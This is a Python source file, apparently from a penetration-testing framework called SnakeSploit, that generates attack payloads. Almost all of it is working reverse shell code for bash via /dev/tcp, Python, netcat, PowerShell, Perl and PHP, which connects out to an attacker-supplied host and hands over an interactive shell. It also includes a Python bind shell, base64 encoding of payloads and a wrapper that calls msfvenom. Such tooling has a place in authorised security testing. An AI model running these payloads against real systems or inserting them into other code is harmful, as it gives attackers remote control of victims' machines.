"""
SnakeSploit Payload System — generate payloads for various targets.
"""

import base64
import os
import socket
import struct
import sys
from typing import Dict, Optional
from dataclasses import dataclass, field


@dataclass
class Payload:
    """A payload that can be generated and delivered."""
    name: str
    description: str
    payload_type: str = "reverse_shell"
    target_os: str = "linux"
    target_arch: str = "x64"
    lhost: str = "127.0.0.1"
    lport: int = 4444
    encoded: bool = False
    encoder: str = "none"
    code: str = ""
    size: int = 0


class PayloadGenerator:
    """Generates payloads for various platforms."""

    @staticmethod
    def reverse_shell_linux(lhost: str, lport: int) -> str:
        """Generate a Linux reverse shell (bash-based)."""
        # Using bash with /dev/tcp
        return (
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        )

    @staticmethod
    def reverse_shell_python(lhost: str, lport: int) -> str:
        """Generate a Python reverse shell."""
        return (
            f'python3 -c \'import socket,subprocess,os;'
            f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            f's.connect(("{lhost}",{lport}));'
            f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
            f'p=subprocess.call(["/bin/sh","-i"])\''
        )

    @staticmethod
    def reverse_shell_nc(lhost: str, lport: int) -> str:
        """Generate a netcat reverse shell."""
        return f"nc {lhost} {lport} -e /bin/sh"

    @staticmethod
    def reverse_shell_powershell(lhost: str, lport: int) -> str:
        """Generate a PowerShell reverse shell."""
        return (
            f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});'
            f'$stream = $client.GetStream();'
            f'[byte[]]$bytes = 0..65535|%{{0}};'
            f'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;'
            f'$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
            f'$sendback = (iex $data 2>&1 | Out-String );'
            f'$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
            f'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
            f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};'
            f'$client.Close()'
        )

    @staticmethod
    def reverse_shell_perl(lhost: str, lport: int) -> str:
        """Generate a Perl reverse shell."""
        return (
            f'perl -e \'use Socket;'
            f'$i="{lhost}";$p={lport};'
            f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
            f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
            f'exec("/bin/sh -i");}}\''
        )

    @staticmethod
    def bind_shell_python(lhost: str = None, lport: int = 4444) -> str:
        """Generate a Python bind shell. lhost unused but accepted for uniform API."""
        return (
            f'python3 -c \'import socket,subprocess,os;'
            f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            f's.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);'
            f's.bind(("0.0.0.0",{lport}));s.listen(1);'
            f'c,addr=s.accept();'
            f'os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2);'
            f'p=subprocess.call(["/bin/sh","-i"])\''
        )

    @staticmethod
    def reverse_shell_php(lhost: str, lport: int) -> str:
        """Generate a PHP reverse shell."""
        return (
            f'php -r \'$sock=fsockopen("{lhost}",{lport});'
            f'exec("/bin/sh -i <&3 >&3 2>&3");\''
        )

    @staticmethod
    def generate(name: str, lhost: str = "127.0.0.1",
                 lport: int = 4444, encode: bool = False) -> Payload:
        """Generate a payload by name."""
        generators = {
            "linux_reverse": PayloadGenerator.reverse_shell_linux,
            "python_reverse": PayloadGenerator.reverse_shell_python,
            "nc_reverse": PayloadGenerator.reverse_shell_nc,
            "powershell_reverse": PayloadGenerator.reverse_shell_powershell,
            "perl_reverse": PayloadGenerator.reverse_shell_perl,
            "python_bind": PayloadGenerator.bind_shell_python,
            "php_reverse": PayloadGenerator.reverse_shell_php,
        }

        if name not in generators:
            raise ValueError(f"Unknown payload: {name}. Available: {list(generators.keys())}")

        code = generators[name](lhost, lport)

        payload = Payload(
            name=name,
            description=f"Reverse shell on {lhost}:{lport}",
            payload_type="reverse_shell" if "reverse" in name else "bind_shell",
            target_os="linux" if "linux" in name or "python" in name or "perl" in name or "php" in name else "windows",
            lhost=lhost,
            lport=lport,
            code=code,
            size=len(code),
        )

        if encode:
            payload.code = base64.b64encode(code.encode()).decode()
            payload.encoded = True
            payload.encoder = "base64"

        return payload

    @staticmethod
    def generate_msfvenom(name: str, lhost: str, lport: int,
                          format: str = "raw") -> Optional[bytes]:
        """Try to generate using msfvenom if available."""
        import subprocess
        try:
            cmd = [
                "msfvenom",
                "-p", name,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", format,
            ]
            result = subprocess.run(cmd, capture_output=True, timeout=30)
            if result.returncode == 0:
                return result.stdout
            return None
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return None